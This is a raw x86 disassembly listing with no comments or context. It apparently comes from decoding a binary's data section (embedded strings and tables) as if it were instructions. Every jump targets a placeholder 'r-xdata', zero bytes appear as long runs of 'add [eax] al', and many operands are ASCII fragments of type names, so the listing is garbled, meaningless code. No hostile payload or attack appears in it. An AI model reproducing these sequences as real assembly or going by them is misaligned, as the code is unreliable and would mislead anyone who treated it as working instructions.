add al 0xd0
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ ebx + edi * 8 ] ch
inc ebx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
enter 0x43fc 0x0
enter 0x43fb 0x0
inc eax
inc [ ebx ]
mov ah 0xfa
inc ebx
add [ eax - 0x7ffbc07 ] bh
xor eax 0x32dc0040
xchg esp eax
inc esp
jb r-xdata
inc ecx
add [ ecx + ecx * 2 - 0x1c6fffbf ] dh
inc ecx
add [ ebx + 0x41 ] bh
add [ eax + 0x10 ] dl
inc esp
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
nop
rol [ ebx ] cl
add ah bl
cli
inc ebx
add [ ebp + edi * 8 + 0x43 ] dl
add [ esp + edi * 8 + 0x43 ] ah
add [ ebp + edi * 8 - 0x1e7ffbd ] bl
inc ebx
add [ esi + edi * 8 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add al cl
sti
inc ebx
add ah bh
sti
add [ ebp + esi + 0x32dc0040 ] dl
inc ebx
outsd
outsb
je r-xdata
xor eax 0x32dc0040
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x43d2f4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
rol [ ebx ] cl
jo r-xdata
inc ebx
add [ esp + edi * 8 ] dl
inc ebx
add [ eax + 0x700043f9 ] bh
sti
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add [ eax ] ah
cld
inc ebx
add ah dl
cli
inc ebx
add [ eax - 0x4 ] al
inc ebx
add [ ebx + edi * 8 - 0x4b3ffbd ] bl
inc ebx
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 2 - 0x30 ] si
inc ebx
add ah bl
iretd
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x43d4c490
add [ ebx ] al
or al 0x54
inc eax
add al bh
xor al [ eax ]
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
jae r-xdata
add [ eax ] al
in al 0xd1
add [ eax + 0x60043d5 ] cl
outsd
insd
popad
je r-xdata
inc ebx
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x43d3
add [ eax ] al
add [ eax ] al
mov esp 0x70043d3
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax ] dh
salc
inc ebx
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc ecx
add [ esp + edx - 0x598bffbc ] dh
inc ecx
add [ eax + 0x15 ] ah
inc esp
add ah al
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x5a ] bl
inc ecx
add [ esi + 0x13a00041 ] ch
inc esp
add [ ebx + ebp * 8 + 0x14140044 ] dl
inc esp
add [ ebx + ebp * 8 - 0x142fffbc ] bh
inc esp
add [ ebp + edx + 0x14480044 ] cl
inc esp
add [ esp + ebp * 8 ] cl
inc esp
add [ eax ] ah
in al dx
inc esp
add [ eax + 0x48004414 ] al
in al dx
inc esp
add ah bl
adc al 0x44
add [ eax - 0x14 ] dl
inc esp
add ah bh
adc al 0x44
add [ eax - 0x14 ] bl
inc esp
add [ eax ] dl
push ss
inc esp
add al dh
adc eax 0x16300044
inc esp
add [ edx - 0x1393ffbc ] bl
inc esp
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
adc [ eax + eax - 0x60 ] eax
dec edx
add esp esp
aad 0x43
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx * 8 + 0x640b0043 ] bh
jae r-xdata
rcl ch 0x43
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
aam 0x43
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
or al 0xa6
inc ecx
add [ edx + edx - 0x59bfffbc ] dl
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
aad 0x43
add [ esi ] al
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
rol [ eax - 0x2b ] 0x43
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x640043d3 ] ch
add [ eax ] al
add ah cl
mov ebx 0x358c0041
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
and al 0x10
inc esp
add [ eax - 0x5fffbeb6 ] bl
dec edx
rol [ ebx ] cl
cmp [ ecx + eax * 2 + 0x8000400 ] bh
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
hlt
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
hlt
inc ebx
outsd
outsb
jae r-xdata
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add [ eax - 0x4bffbeb6 ] ah
dec ecx
inc ecx
add [ eax + 0x70004412 ] al
adc [ eax + eax + 0x10 ] eax
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc ecx
add [ ecx + ecx * 2 + 0x12800041 ] dh
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ eax - 0x6bffbbed ] ah
jmp r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43d64074
jb r-xdata
popad
js r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
add al bh
xor al [ eax ]
mov [ ecx + 0x41 ] cl
add [ ecx + edx + 0x4aa00044 ] ch
mov al [ 0xffffffff94004035 ]
xor eax 0x32dc0040
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
aad 0x43
add [ ebx ] al
add [ eax - 0x14 ] dh
inc esp
add [ eax + 0x15 ] al
inc esp
add [ eax + 0x12004412 ] dh
push esp
inc ebx
outsd
outsb
je r-xdata
add [ esp + ebp * 8 + 0x44 ] ch
add [ ebp - 0x2bcfffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 8 + 0x1c0043 ] ch
add [ eax ] al
lodsb [ esi ]
in al 0x44
add [ ebp + esi + 0x35980040 ] cl
inc eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x43d80cc0 ] cl
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
pop es
add [ eax + eax ] dl
add bh bh
hlt
salc
salc
inc ebx
add [ eax ] dl
add [ eax ] al
push esp
adc [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
imul ebp [ esi + 0x74 ] 0x43d6ac73
add [ ecx + 0x41 ] dl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
fcom st6
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0xd5e8c08b
inc ebx
add [ ebx ] al
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
mov ebp ss
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
inc esp
add [ eax + 0x11 ] dh
inc esp
add [ eax ] dl
add eax 0x0
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
inc ebx
imul ebp [ esi + 0x64 ] 0x1
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
call 0x34419be
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax - 0x57ffbff0 ] al
sbb [ ecx ] eax
nop
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
push esp
adc [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax - 0x2a ] al
inc ebx
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add ah ah
aad 0x43
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ ecx + edx ] bl
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
mov esp 0x80043d8
adc [ eax ] 0x40
add [ eax - 0x6fffbee7 ] ch
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x43d64074
imul esp [ gs : edi + 0x68 ] 0x43d64074
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
aad 0x43
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ ebp + edx * 8 + 0x9030043 ] cl
push esp
inc esp
jb r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx * 8 + 0x10000043 ] bh
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
sbb al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push cs
inc ebx
add [ eax ] cl
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
loopne r-xdata
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
cmp al 0xd5
inc ebx
add [ eax ] al
adc [ eax ] al
nop
sbb cl 0x43
add [ eax ] cl
push cs
outsb
je r-xdata
sbb al 0x11
inc eax
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
jo r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
sbb al 0x11
inc eax
add ah bl
iretd
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
dec ecx
outsb
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
test dl bl
inc ebx
add [ eax ] cl
push cs
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1c ] si
adc [ eax ] eax
fmul st7
inc ebx
add [ eax ] ch
fiadd [ ebx ]
or [ 0x646e4554 ] cl
inc esp
pop es
dec ecx
outsb
je r-xdata
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
dec ebx
jns r-xdata
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
clc
fadd [ ebx ]
or [ esi ] cl
push esp
inc ebx
push 0x1c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x2707ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
sbb al 0x11
inc eax
add [ edx + edx * 8 + 0x43 ] bh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x2513ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
sbb al 0x11
inc eax
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx + ebx * 8 + 0xe080043 ] al
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
sbb al 0x11
inc eax
add al al
aam 0x43
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
or al 0xd8
inc ebx
sbb al 0x11
inc eax
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x261fffc0 ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] bl
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
jb r-xdata
inc ebx
add [ esp + ebx * 8 ] dh
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ edx + edx * 8 + 0x43 ] bh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx * 8 + 0x10000043 ] bh
inc eax
add [ eax + r-xdata ] dl
sbb al 0x11
outsb
je r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
rcr ah 0x43
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
aam 0xe1
inc ebx
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1c ] si
adc [ eax ] eax
jl r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
push 0x65
jb r-xdata
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
inc edx
outsd
outsd
insb
popad
outsb
outsb
jb r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
rcr ch 0x43
jpe r-xdata
jb r-xdata
add [ ecx + ebp * 8 + 0x10000043 ] ch
inc eax
add al ch
fild [ ebx ]
or [ edi ] cl
push esp
push ebx
je r-xdata
add eax 0x65530608
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43de48c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43ddc0c0 ] cl
add [ eax + edx + 0x40 ] dl
jbe r-xdata
inc ebp
push edx
jae r-xdata
push es
jb r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
outsb
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
dec eax
fiadd [ ebx ]
or [ esi ] dl
je r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
jpe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
loopne r-xdata
js r-xdata
insb
outsd
ja r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
sbb al 0x11
inc eax
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
add [ eax ] ecx
arpl [ ecx + eax + 0x8 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xor ch bl
inc ebx
add [ eax ] cl
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
inc esp
add [ eax ] bh
add dl cl
loope r-xdata
and eax [ eax + eax + 0x38 ]
add [ eax ] al
add al 0x2c
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
js r-xdata
outsb
je r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax + 0x16 ] dl
inc esp
add [ eax ] ah
xor eax 0x351c0044
inc esp
add ah ch
xor eax 0x18940044
inc esp
add al bl
pop ds
inc esp
add [ edi + ebx ] bh
inc esp
add [ eax + ebp + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax + 0xe ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] bh
add [ eax ] al
mov esp 0x54004010
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
